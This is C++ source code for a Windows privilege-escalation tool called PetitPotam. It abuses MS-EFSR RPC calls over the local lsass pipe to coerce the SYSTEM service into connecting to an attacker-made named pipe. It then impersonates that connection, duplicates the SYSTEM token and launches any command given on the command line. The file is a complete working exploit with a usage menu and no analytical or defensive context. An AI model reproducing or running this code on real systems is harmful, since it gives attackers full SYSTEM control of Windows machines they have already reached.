#include "ms-efsr_h.h"
#include <windows.h>
#include <stdio.h>
#include <thread>
#include <tchar.h>
#include <strsafe.h>
#include <conio.h>
#include <iostream>
#include <userenv.h>

#pragma comment(lib, "RpcRT4.lib")
#pragma comment(lib, "userenv.lib")


DWORD WINAPI StartPetitPipeServer(LPVOID lpParam);
void GetSystem(HANDLE hNamedPipe, LPWSTR lpCommandLine);
void ConnectPetitPotam(DWORD EfsID);
void Usage();

BOOL g_bInteractWithConsole = TRUE;

void _tmain(int argc, TCHAR* argv[])
{
    if (argc != 5)
    {
        Usage();
    }

    HANDLE hThread = NULL;
    hThread = CreateThread(NULL, 0, StartPetitPipeServer, (LPWSTR)argv[4], 0, NULL);
    DWORD EfsID = (DWORD)_wtol((TCHAR*)argv[2]);

    Sleep(1000);
    ConnectPetitPotam(EfsID);
    Sleep(1500);
}

void Usage() {
    printf("\nUsage: PetitPotam.exe -i EfsID -c command\n\n");
    printf("The available EfsIDs are as follows: \n");
    printf("    [0] EfsRpcOpenFileRaw\n");
    printf("    [1] EfsRpcEncryptFileSrv\n");
    printf("    [2] EfsRpcDecryptFileSrv\n");
    printf("    [3] EfsRpcQueryUsersOnFile\n");
    printf("    [4] EfsRpcQueryRecoveryAgents\n");
    printf("    [5] EfsRpcAddUsersToFile\n");
    printf("    [6] EfsRpcFileKeyInfo\n");
    printf("    [7] EfsRpcAddUsersToFileEx\n");
    return;
}

DWORD WINAPI StartPetitPipeServer(LPVOID lpParam)
{
    HANDLE hNamedPipe = NULL;
    LPWSTR lpName;
    LPWSTR lpCommandLine = (LPWSTR)lpParam;

    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };

    lpName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(lpName, MAX_PATH, L"\\\\.\\pipe\\petit\\pipe\\srvsvc");

    if ((hNamedPipe = CreateNamedPipe(lpName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)))
    {
        printf("\n[+] CreateNamedPipe %S OK\n", lpName);
    }


    if (ConnectNamedPipe(hNamedPipe, NULL) != NULL)
    {
        printf("[+] ConnectNamedPipe OK\n");
    }

    GetSystem(hNamedPipe, lpCommandLine);
    CloseHandle(hNamedPipe);

    return 0;
}


void GetSystem(HANDLE hNamedPipe, LPWSTR lpCommandLine)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    HANDLE hToken = NULL;
    HANDLE phNewToken = NULL;

    DWORD dwCreationFlags = 0;
    LPWSTR lpCurrentDirectory = NULL;
    LPVOID lpEnvironment = NULL;

    // clear a block of memory
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (ImpersonateNamedPipeClient(hNamedPipe))
    {
        printf("[+] ImpersonateNamedPipeClient OK.\n");
    }
    else
    {
        printf("[-] ImpersonateNamedPipeClient() Error: %d.\n", GetLastError());
        goto cleanup;
    }

    if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken))
    {
        printf("[+] OpenThreadToken OK\n");
    }
    else
    {
        printf("[-] OpenThreadToken() Error: %d.\n", GetLastError());
        goto cleanup;
    }

    if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &phNewToken))
    {
        printf("[+] DuplicateTokenEx OK\n");
    }
    else
    {
        printf("[-] DupicateTokenEx() Error: %d.\n", GetLastError());
        goto cleanup;
    }

    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
    dwCreationFlags |= g_bInteractWithConsole ? 0 : CREATE_NEW_CONSOLE;

    if (!(lpCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
    {
        goto cleanup;
    }

    if (!GetSystemDirectory(lpCurrentDirectory, MAX_PATH))
    {
        printf("[-] GetSystemDirectory() Error: %d.\n", GetLastError());
        goto cleanup;
    }

    if (!CreateEnvironmentBlock(&lpEnvironment, phNewToken, FALSE))
    {
        printf("[-] CreateEnvironmentBlock() Error: %d.\n", GetLastError());
        goto cleanup;
    }

    if (CreateProcessAsUser(phNewToken, NULL, lpCommandLine, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &si, &pi))
    {
        printf("[+] CreateProcessAsUser OK\n");
    }
    else if (GetLastError() != NULL)
    {
        RevertToSelf();
        printf("[*] CreateProcessAsUser() failed, possibly due to missing privileges, retrying with CreateProcessWithTokenW().\n");

        if (CreateProcessWithTokenW(phNewToken, LOGON_WITH_PROFILE, NULL, lpCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &si, &pi))
        {
            printf("[+] CreateProcessWithTokenW OK\n");
        }
        else
        {
            printf("[-] CreateProcessWithTokenW failed %d.\n", GetLastError());
            goto cleanup;
        }
    }

    if (g_bInteractWithConsole)
    {
        fflush(stdout);
        WaitForSingleObject(pi.hProcess, INFINITE);
    }

cleanup:
    if (hToken)
        CloseHandle(hToken);
    if (phNewToken)
        CloseHandle(phNewToken);
    if (lpCurrentDirectory)
        free(lpCurrentDirectory);
    if (lpEnvironment)
        DestroyEnvironmentBlock(lpEnvironment);
    if (pi.hProcess)
        CloseHandle(pi.hProcess);
    if (pi.hThread)
        CloseHandle(pi.hThread);

    return;
}


void ConnectPetitPotam(DWORD EfsID) {
    RPC_STATUS status;
    RPC_BINDING_HANDLE binding;
    RPC_WSTR StringBinding;

    status = RpcStringBindingCompose(
        (RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e",
        (RPC_WSTR)L"ncacn_np",
        (RPC_WSTR)L"\\\\127.0.0.1",
        (RPC_WSTR)L"\\pipe\\lsass",
        NULL,
        &StringBinding
    );
    if (status != RPC_S_OK) {
        printf("[-] RpcStringBindingCompose error: %d\n", GetLastError());
        return;
    }

    //绑定接口
    status = RpcBindingFromStringBinding(StringBinding, &binding);
    if (status != RPC_S_OK) {
        printf("[-] RpcBindingFromStringBinding error: %d\n", GetLastError());
        return;
    }

    //释放资源
    status = RpcStringFree(&StringBinding);
    if (status != RPC_S_OK) {
        printf("[-] RpcStringFree error: %d\n", GetLastError());
        return;
    }

    //调用rpc
    RpcTryExcept{
    PVOID pContext;
    LPWSTR pipeFileName;
    long result;
    pipeFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
    StringCchPrintf(pipeFileName, MAX_PATH, L"\\\\127.0.0.1/pipe/petit\\C$\\test.txt");

    if (EfsID == 0) {
        result = Proc0_EfsRpcOpenFileRaw_Downlevel(binding, &pContext, pipeFileName, 0);
    }
    if (EfsID == 1) {
        result = Proc4_EfsRpcEncryptFileSrv_Downlevel(binding,pipeFileName);
    }
    if (EfsID == 2) {
        result = Proc5_EfsRpcDecryptFileSrv_Downlevel(binding, pipeFileName,0);
    }
    if (EfsID == 3) {
        Struct_220_t* Users;
        result = Proc6_EfsRpcQueryUsersOnFile_Downlevel(binding, pipeFileName,&Users);
    }
    if (EfsID == 4) {
        Struct_220_t* RecoveryAgents;
        result = Proc7_EfsRpcQueryRecoveryAgents_Downlevel(binding, pipeFileName,&RecoveryAgents);
    }
    if (EfsID == 5) {
        Struct_346_t EncryptionCertificates;
        result = Proc9_EfsRpcAddUsersToFile_Downlevel(binding, pipeFileName,&EncryptionCertificates);
    }
    if (EfsID == 6) {
        Struct_392_t* Keyinfo;
        Proc12_EfsRpcFileKeyInfo_Downlevel(binding, pipeFileName,0,&Keyinfo);
    }
    if (EfsID == 7) {
        Struct_392_t Reserved;
        Struct_346_t EncryptionCertificates;
        result = Proc15_EfsRpcAddUsersToFileEx_Downlevel(binding,0, &Reserved,pipeFileName,&EncryptionCertificates);
    }

    LocalFree(pipeFileName);

    };

    RpcExcept(EXCEPTION_EXECUTE_HANDLER) {
        wprintf(L"[-]RpcExceptionCode: %d\n", RpcExceptionCode());
    }
    RpcEndExcept{
        RpcBindingFree(&binding);
    }
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}